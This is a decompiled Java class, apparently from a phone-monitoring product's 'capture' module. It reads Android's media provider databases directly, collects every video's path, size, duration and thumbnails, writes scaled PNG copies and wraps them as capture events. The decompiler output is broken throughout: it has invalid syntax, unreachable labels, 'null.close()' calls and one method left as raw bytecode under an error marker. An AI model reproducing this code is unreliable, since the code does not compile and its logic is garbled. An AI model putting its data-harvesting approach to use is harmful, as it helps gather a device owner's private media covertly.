package com.vvt.capture.camera.video.a;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.SystemClock;
import com.vvt.ag.b;
import com.vvt.capture.camera.video.c;
import com.vvt.events.FxMediaType;
import com.vvt.events.f;
import com.vvt.events.j;
import com.vvt.io.d;
import com.vvt.io.p;
import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

public class a
{
  private static final boolean a;
  private static final boolean b;
  private static final boolean c;
  private static final File[] d;
  private static final String[] e;
  
  static
  {
    int i = 2;
    boolean bool1 = true;
    boolean bool2 = com.vvt.ak.a.a;
    if (bool2) {
      bool2 = bool1;
    }
    for (;;)
    {
      a = bool2;
      b = com.vvt.ak.a.b;
      c = com.vvt.ak.a.e;
      Object localObject = new File[i];
      File localFile = new java/io/File;
      localFile.<init>("/data/data/com.android.providers.media/databases/");
      localObject[0] = localFile;
      localFile = new java/io/File;
      localFile.<init>("/dbdata/databases/com.android.providers.media/");
      localObject[bool1] = localFile;
      d = (File[])localObject;
      localObject = new String[4];
      localObject[0] = "video_id";
      localObject[bool1] = "width";
      localObject[i] = "height";
      localObject[3] = "_data";
      e = (String[])localObject;
      return;
      bool2 = false;
      localObject = null;
    }
  }
  
  public static String a()
  {
    boolean bool1 = a;
    if (bool1) {}
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    File[] arrayOfFile = d;
    String str1 = "external";
    String str2 = "db";
    boolean bool2 = d.a(arrayOfFile, str1, localStringBuilder, str2);
    if (!bool2)
    {
      bool2 = c;
      if (!bool2) {
        break label67;
      }
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return localStringBuilder.toString();
      label67:
      bool2 = b;
      if (!bool2) {}
    }
  }
  
  public static ArrayList a(String paramString1, String paramString2, List paramList1, List paramList2)
  {
    boolean bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    if ((paramList1 == null) || (paramList2 == null)) {}
    for (Object localObject = localArrayList;; localObject = localArrayList)
    {
      return (ArrayList)localObject;
      Iterator localIterator = paramList2.iterator();
      for (;;)
      {
        bool = localIterator.hasNext();
        if (!bool) {
          break;
        }
        long l = ((Long)localIterator.next()).longValue();
        localObject = Long.valueOf(l);
        bool = paramList1.contains(localObject);
        if (!bool)
        {
          bool = a;
          if (bool) {}
          localObject = a(paramString1, paramString2, l);
          localArrayList.addAll((Collection)localObject);
        }
      }
      bool = a;
      if (!bool) {}
    }
  }
  
  private static List a(SQLiteDatabase paramSQLiteDatabase, long paramLong)
  {
    boolean bool1 = a;
    if (bool1) {}
    j = 2;
    localObject1 = new Object[j];
    String[] arrayOfString = null;
    localObject1[0] = "video_id";
    int k = 1;
    Object localObject2 = Long.valueOf(paramLong);
    localObject1[k] = localObject2;
    localObject2 = String.format("%s = %d", (Object[])localObject1);
    Object localObject3 = "";
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    localObject1 = "videothumbnails";
    try
    {
      arrayOfString = e;
      localObject3 = paramSQLiteDatabase;
      localObject1 = paramSQLiteDatabase.query((String)localObject1, arrayOfString, (String)localObject2, null, null, null, null);
      if (localObject1 == null) {
        break label165;
      }
      try
      {
        for (;;)
        {
          bool1 = ((Cursor)localObject1).moveToNext();
          if (!bool1) {
            break;
          }
          localObject3 = "_data";
          int i = ((Cursor)localObject1).getColumnIndex((String)localObject3);
          localObject3 = ((Cursor)localObject1).getString(i);
          localArrayList.add(localObject3);
        }
        if (localObject1 == null) {
          break label162;
        }
      }
      finally {}
    }
    finally
    {
      for (;;)
      {
        label162:
        boolean bool2;
        j = 0;
        localObject1 = null;
      }
    }
    ((Cursor)localObject1).close();
    throw ((Throwable)localObject4);
    label165:
    if (localObject1 != null) {
      ((Cursor)localObject1).close();
    }
    bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    return localArrayList;
  }
  
  public static List a(String paramString)
  {
    bool1 = false;
    localCursor = null;
    synchronized (a.class)
    {
      boolean bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      ArrayList localArrayList = new java/util/ArrayList;
      localArrayList.<init>();
      localSQLiteDatabase = b(paramString);
      boolean bool3 = false;
      Object localObject3 = null;
      if (localSQLiteDatabase != null) {}
      try
      {
        boolean bool5 = localSQLiteDatabase.isDbLockedByCurrentThread();
        if (!bool5)
        {
          bool5 = localSQLiteDatabase.isDbLockedByOtherThreads();
          if (!bool5) {
            break label125;
          }
        }
        bool5 = a;
        if ((!bool5) || (localSQLiteDatabase != null)) {
          localSQLiteDatabase.close();
        }
        if (0 != 0) {
          null.close();
        }
        if (localSQLiteDatabase != null) {
          localSQLiteDatabase.close();
        }
      }
      catch (Exception localException)
      {
        int j;
        Object[] arrayOfObject;
        int k;
        String str;
        boolean bool6;
        int i;
        long l;
        boolean bool4 = c;
        if ((bool4) && (localCursor == null)) {
          break label283;
        }
        localCursor.close();
        if (localSQLiteDatabase == null) {
          break label293;
        }
        localSQLiteDatabase.close();
        for (;;)
        {
          bool1 = a;
          if (bool1) {}
          bool1 = a;
          if (!bool1) {
            break;
          }
          break;
          bool4 = c;
          if ((!bool4) || (localCursor != null)) {
            localCursor.close();
          }
          if (localSQLiteDatabase != null) {
            localSQLiteDatabase.close();
          }
        }
        localObject1 = finally;
        throw ((Throwable)localObject1);
      }
      finally
      {
        if (localCursor == null) {
          break label364;
        }
        localCursor.close();
        if (localSQLiteDatabase == null) {
          break label374;
        }
        localSQLiteDatabase.close();
      }
      return localArrayList;
      label125:
      localObject3 = "SELECT %s FROM %s";
      j = 2;
      arrayOfObject = new Object[j];
      k = 0;
      str = "_id";
      arrayOfObject[0] = str;
      k = 1;
      str = "video";
      arrayOfObject[k] = str;
      localObject3 = String.format((String)localObject3, arrayOfObject);
      bool6 = a;
      if (bool6) {}
      bool6 = false;
      arrayOfObject = null;
      localCursor = localSQLiteDatabase.rawQuery((String)localObject3, null);
      if (localCursor != null)
      {
        bool3 = localCursor.moveToNext();
        if (!bool3) {
          break label322;
        }
        localObject3 = "_id";
        i = localCursor.getColumnIndex((String)localObject3);
        l = localCursor.getLong(i);
        localObject3 = Long.valueOf(l);
        localArrayList.add(localObject3);
      }
    }
  }
  
  public static List a(String paramString, int paramInt)
  {
    bool1 = false;
    localCursor = null;
    synchronized (a.class)
    {
      boolean bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      ArrayList localArrayList = new java/util/ArrayList;
      localArrayList.<init>();
      localSQLiteDatabase = b(paramString);
      int i = 0;
      Object localObject3 = null;
      if (localSQLiteDatabase != null) {}
      try
      {
        boolean bool5 = localSQLiteDatabase.isDbLockedByCurrentThread();
        if (!bool5)
        {
          bool5 = localSQLiteDatabase.isDbLockedByOtherThreads();
          if (!bool5) {
            break label128;
          }
        }
        bool5 = a;
        if ((!bool5) || (localSQLiteDatabase != null)) {
          localSQLiteDatabase.close();
        }
        if (0 != 0) {
          null.close();
        }
        if (localSQLiteDatabase != null) {
          localSQLiteDatabase.close();
        }
      }
      catch (Exception localException)
      {
        int k;
        Object[] arrayOfObject;
        int m;
        Object localObject4;
        boolean bool6;
        boolean bool3;
        int j;
        long l;
        boolean bool4 = c;
        if ((bool4) && (localCursor == null)) {
          break label329;
        }
        localCursor.close();
        if (localSQLiteDatabase == null) {
          break label339;
        }
        localSQLiteDatabase.close();
        for (;;)
        {
          bool1 = a;
          if (bool1) {}
          bool1 = a;
          if (!bool1) {
            break;
          }
          break;
          bool4 = c;
          if ((!bool4) || (localCursor != null)) {
            localCursor.close();
          }
          if (localSQLiteDatabase != null) {
            localSQLiteDatabase.close();
          }
        }
        localObject1 = finally;
        throw ((Throwable)localObject1);
      }
      finally
      {
        if (localCursor == null) {
          break label411;
        }
        localCursor.close();
        if (localSQLiteDatabase == null) {
          break label421;
        }
        localSQLiteDatabase.close();
      }
      return localArrayList;
      label128:
      i = -1;
      if (paramInt == i) {
        paramInt = -1 >>> 1;
      }
      localObject3 = "SELECT %s FROM %s ORDER BY %s DESC LIMIT %d";
      k = 4;
      arrayOfObject = new Object[k];
      m = 0;
      localObject4 = "_id";
      arrayOfObject[0] = localObject4;
      m = 1;
      localObject4 = "video";
      arrayOfObject[m] = localObject4;
      m = 2;
      localObject4 = "_id";
      arrayOfObject[m] = localObject4;
      m = 3;
      localObject4 = Integer.valueOf(paramInt);
      arrayOfObject[m] = localObject4;
      localObject3 = String.format((String)localObject3, arrayOfObject);
      bool6 = a;
      if (bool6) {}
      bool6 = false;
      arrayOfObject = null;
      localCursor = localSQLiteDatabase.rawQuery((String)localObject3, null);
      if (localCursor != null)
      {
        bool3 = localCursor.moveToNext();
        if (!bool3) {
          break label368;
        }
        localObject3 = "_id";
        j = localCursor.getColumnIndex((String)localObject3);
        l = localCursor.getLong(j);
        localObject3 = Long.valueOf(l);
        localArrayList.add(localObject3);
      }
    }
  }
  
  private static List a(String paramString1, String paramString2, long paramLong)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    int i = 2;
    Object localObject1 = new Object[i];
    localObject1[0] = "_id";
    Object localObject4 = Long.valueOf(paramLong);
    localObject1[1] = localObject4;
    localObject4 = String.format("%s = %d", (Object[])localObject1);
    SQLiteDatabase localSQLiteDatabase = b(paramString2);
    boolean bool4 = false;
    c localc = null;
    localObject1 = "video";
    localCursor = null;
    int k = 0;
    Object localObject5 = null;
    String str = null;
    int m = 0;
    FxMediaType localFxMediaType = null;
    for (;;)
    {
      try
      {
        localCursor = localSQLiteDatabase.query((String)localObject1, null, (String)localObject4, null, null, null, null);
        if (localCursor == null) {
          continue;
        }
        int n;
        long l2;
        try
        {
          boolean bool2 = localCursor.moveToNext();
          if (!bool2) {
            continue;
          }
          localObject1 = "_id";
          int j = localCursor.getColumnIndexOrThrow((String)localObject1);
          j = localCursor.getInt(j);
          localObject4 = "_data";
          n = localCursor.getColumnIndexOrThrow((String)localObject4);
          str = localCursor.getString(n);
          localObject4 = "mime_type";
          n = localCursor.getColumnIndexOrThrow((String)localObject4);
          localObject4 = localCursor.getString(n);
          localObject5 = "duration";
          k = localCursor.getColumnIndexOrThrow((String)localObject5);
          m = localCursor.getInt(k);
          localFxMediaType = f.a((String)localObject4);
          localObject4 = new java/util/Date;
          ((Date)localObject4).<init>();
          long l1 = ((Date)localObject4).getTime();
          localObject4 = "_size";
          n = localCursor.getColumnIndexOrThrow((String)localObject4);
          l2 = localCursor.getLong(n);
          str = d.h(str);
          bool4 = a;
          if (bool4) {}
          long l3 = 0L;
          bool4 = l2 < l3;
          if (!bool4)
          {
            localObject4 = new java/io/File;
            ((File)localObject4).<init>(str);
            l2 = ((File)localObject4).length();
          }
          bool4 = d.e(str);
          if (bool4)
          {
            l3 = 0L;
            bool4 = l2 < l3;
            if (bool4) {}
          }
          else
          {
            bool3 = a;
            if (!bool3) {
              continue;
            }
            continue;
          }
          localc = new com/vvt/capture/camera/video/c;
          localc.<init>();
          localc.a(l1);
          localc.c(l2);
          localc.a(localFxMediaType);
          l2 = bool3;
          localc.b(l2);
          n = m / 1000;
          localc.a(n);
          localc.a(str);
          l2 = bool3;
        }
        finally {}
      }
      finally
      {
        boolean bool3;
        localCursor = null;
        continue;
      }
      try
      {
        localObject1 = a(localSQLiteDatabase, l2);
        n = ((List)localObject1).size();
        if (n > 0)
        {
          localObject4 = ((List)localObject1).iterator();
          bool3 = ((Iterator)localObject4).hasNext();
          if (bool3)
          {
            localObject1 = ((Iterator)localObject4).next();
            localObject1 = (String)localObject1;
            localObject5 = new java/io/File;
            ((File)localObject5).<init>((String)localObject1);
            boolean bool5 = ((File)localObject5).exists();
            if (!bool5) {
              continue;
            }
            bool5 = a;
            if (bool5) {}
            bool5 = b.a((String)localObject1);
            if (bool5) {
              continue;
            }
            localObject1 = b(paramString1, (String)localObject1, paramLong);
            localObject5 = new com/vvt/events/j;
            ((j)localObject5).<init>();
            str = null;
            ((j)localObject5).a(null);
            ((j)localObject5).a((String)localObject1);
            localc.a((j)localObject5);
            bool3 = a;
            if (!bool3) {
              continue;
            }
            continue;
          }
        }
        else
        {
          localObject1 = new com/vvt/events/j;
          ((j)localObject1).<init>();
          localc.a((j)localObject1);
        }
      }
      catch (Exception localException)
      {
        bool3 = c;
        if (!bool3) {
          continue;
        }
        continue;
      }
      localArrayList.add(localc);
    }
    if (localCursor != null) {
      localCursor.close();
    }
    if (localSQLiteDatabase != null) {
      localSQLiteDatabase.close();
    }
    throw ((Throwable)localObject2);
    bool3 = c;
    if ((!bool3) || (localCursor != null)) {
      localCursor.close();
    }
    if (localSQLiteDatabase != null) {
      localSQLiteDatabase.close();
    }
    bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
  
  private static SQLiteDatabase b(String paramString)
  {
    return b(paramString, 17);
  }
  
  private static SQLiteDatabase b(String paramString, int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    SQLiteDatabase localSQLiteDatabase = c(paramString, paramInt);
    int i = 5;
    while ((localSQLiteDatabase == null) && (i > 0))
    {
      boolean bool3 = a;
      if (bool3) {}
      long l = 1000L;
      SystemClock.sleep(l);
      localSQLiteDatabase = c(paramString, paramInt);
      i += -1;
    }
    boolean bool2 = a;
    if (bool2) {}
    return localSQLiteDatabase;
  }
  
  public static String b()
  {
    boolean bool1 = a;
    if (bool1) {}
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    File[] arrayOfFile = d;
    String str1 = "internal";
    String str2 = "db";
    boolean bool2 = d.a(arrayOfFile, str1, localStringBuilder, str2);
    if (!bool2)
    {
      bool2 = c;
      if (!bool2) {
        break label68;
      }
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return localStringBuilder.toString();
      label68:
      bool2 = a;
      if (!bool2) {}
    }
  }
  
  /* Error */
  private static String b(String paramString1, String paramString2, long paramLong)
  {
    // Byte code:
    //   0: getstatic 19	com/vvt/capture/camera/video/a/a:a	Z
    //   3: istore 4
    //   5: iload 4
    //   7: ifeq +3 -> 10
    //   10: ldc 118
    //   12: astore 5
    //   14: iconst_0
    //   15: istore 6
    //   17: aconst_null
    //   18: astore 7
    //   20: aload_1
    //   21: invokestatic 281	android/graphics/BitmapFactory:decodeFile	(Ljava/lang/String;)Landroid/graphics/Bitmap;
    //   24: astore 8
    //   26: aload 8
    //   28: ifnull +160 -> 188
    //   31: aload 8
    //   33: invokevirtual 286	android/graphics/Bitmap:getWidth	()I
    //   36: istore 9
    //   38: iload 9
    //   40: i2f
    //   41: fstore 10
    //   43: aload 8
    //   45: invokevirtual 289	android/graphics/Bitmap:getHeight	()I
    //   48: istore 11
    //   50: iload 11
    //   52: i2f
    //   53: fstore 12
    //   55: fload 10
    //   57: fload 12
    //   59: fdiv
    //   60: fstore 10
    //   62: getstatic 19	com/vvt/capture/camera/video/a/a:a	Z
    //   65: istore 11
    //   67: iload 11
    //   69: ifeq +3 -> 72
    //   72: fload 10
    //   74: ldc_w 291
    //   77: fmul
    //   78: fstore 10
    //   80: fload 10
    //   82: f2i
    //   83: istore 9
    //   85: sipush 800
    //   88: istore 11
    //   90: ldc_w 292
    //   93: fstore 12
    //   95: iconst_1
    //   96: istore 13
    //   98: aload 8
    //   100: iload 9
    //   102: iload 11
    //   104: iload 13
    //   106: invokestatic 296	android/graphics/Bitmap:createScaledBitmap	(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;
    //   109: astore 14
    //   111: getstatic 19	com/vvt/capture/camera/video/a/a:a	Z
    //   114: istore 15
    //   116: iload 15
    //   118: ifeq +3 -> 121
    //   121: aload_0
    //   122: invokestatic 298	com/vvt/capture/camera/video/a/a:MyUncaughtExceptionHandler	(Ljava/lang/String;)Ljava/lang/String;
    //   125: astore 8
    //   127: new 300	java/io/FileOutputStream
    //   130: astore 5
    //   132: aload 5
    //   134: aload 8
    //   136: invokespecial 301	java/io/FileOutputStream:<init>	(Ljava/lang/String;)V
    //   139: getstatic 307	android/graphics/Bitmap$CompressFormat:PNG	Landroid/graphics/Bitmap$CompressFormat;
    //   142: astore 7
    //   144: bipush 90
    //   146: istore 11
    //   148: ldc_w 308
    //   151: fstore 12
    //   153: aload 14
    //   155: aload 7
    //   157: iload 11
    //   159: aload 5
    //   161: invokevirtual 312	android/graphics/Bitmap:compress	(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z
    //   164: pop
    //   165: getstatic 19	com/vvt/capture/camera/video/a/a:a	Z
    //   168: istore 6
    //   170: iload 6
    //   172: ifeq +3 -> 175
    //   175: aload 14
    //   177: invokevirtual 315	android/graphics/Bitmap:recycle	()V
    //   180: aload 5
    //   182: astore 7
    //   184: aload 8
    //   186: astore 5
    //   188: aload 7
    //   190: invokestatic 318	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   193: getstatic 19	com/vvt/capture/camera/video/a/a:a	Z
    //   196: istore 6
    //   198: iload 6
    //   200: ifeq +3 -> 203
    //   203: getstatic 19	com/vvt/capture/camera/video/a/a:a	Z
    //   206: istore 6
    //   208: iload 6
    //   210: ifeq +3 -> 213
    //   213: aload 5
    //   215: areturn
    //   216: astore 8
    //   218: getstatic 26	com/vvt/capture/camera/video/a/a:MyUncaughtExceptionHandler	Z
    //   221: istore 15
    //   223: iload 15
    //   225: ifeq -37 -> 188
    //   228: goto -40 -> 188
    //   231: astore 5
    //   233: aload 7
    //   235: invokestatic 318	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   238: aload 5
    //   240: athrow
    //   241: astore 5
    //   243: aload 8
    //   245: astore 5
    //   247: goto -29 -> 218
    //   250: astore 7
    //   252: aload 5
    //   254: astore 7
    //   256: aload 8
    //   258: astore 5
    //   260: goto -42 -> 218
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	263	0	paramString1	String
    //   0	263	1	paramString2	String
    //   0	263	2	paramLong	long
    //   3	3	4	bool1	boolean
    //   12	202	5	localObject1	Object
    //   231	8	5	localObject2	Object
    //   241	1	5	localObject3	Object
    //   245	14	5	localObject4	Object
    //   15	194	6	bool2	boolean
    //   18	216	7	localObject5	Object
    //   250	1	7	localObject6	Object
    //   254	1	7	localObject7	Object
    //   24	161	8	localObject8	Object
    //   216	41	8	localObject9	Object
    //   36	65	9	i	int
    //   41	40	10	f1	float
    //   48	3	11	j	int
    //   65	3	11	bool3	boolean
    //   88	70	11	k	int
    //   53	99	12	f2	float
    //   96	9	13	bool4	boolean
    //   109	67	14	localBitmap	android.graphics.Bitmap
    //   114	110	15	bool5	boolean
    // Exception table:
    //   from	to	target	type
    //   20	24	216	finally
    //   31	36	216	finally
    //   43	48	216	finally
    //   62	65	216	finally
    //   104	109	216	finally
    //   111	114	216	finally
    //   121	125	216	finally
    //   218	221	231	finally
    //   127	130	241	finally
    //   134	139	241	finally
    //   139	142	250	finally
    //   159	165	250	finally
    //   165	168	250	finally
    //   175	180	250	finally
  }
  
  private static SQLiteDatabase c(String paramString, int paramInt)
  {
    for (SQLiteDatabase localSQLiteDatabase = null;; localSQLiteDatabase = SQLiteDatabase.openDatabase(paramString, null, paramInt))
    {
      try
      {
        localFile = new java/io/File;
        localFile.<init>(paramString);
        bool = localFile.exists();
        if (bool) {
          break label34;
        }
        bool = c;
        if (!bool) {}
      }
      catch (SQLiteException localSQLiteException)
      {
        for (;;)
        {
          File localFile;
          label34:
          boolean bool = c;
          if (!bool) {}
        }
      }
      return localSQLiteDatabase;
      bool = false;
      localFile = null;
    }
  }
  
  private static String c(String paramString)
  {
    Object localObject1 = p.a(paramString, "thumbnails");
    Object localObject2 = new java/io/File;
    ((File)localObject2).<init>((String)localObject1);
    boolean bool = ((File)localObject2).mkdirs();
    if (bool)
    {
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject2 = ((StringBuilder)localObject2).append("image_");
      long l1 = System.currentTimeMillis();
      localObject2 = ((StringBuilder)localObject2).append(l1);
      String str = ".png";
      localObject2 = str;
    }
    for (localObject1 = p.a((String)localObject1, (String)localObject2);; localObject1 = p.a(paramString, (String)localObject1))
    {
      return (String)localObject1;
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject1 = ((StringBuilder)localObject1).append("image_");
      long l2 = System.currentTimeMillis();
      localObject1 = ((StringBuilder)localObject1).append(l2);
      localObject2 = ".png";
      localObject1 = (String)localObject2;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/camera/video/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */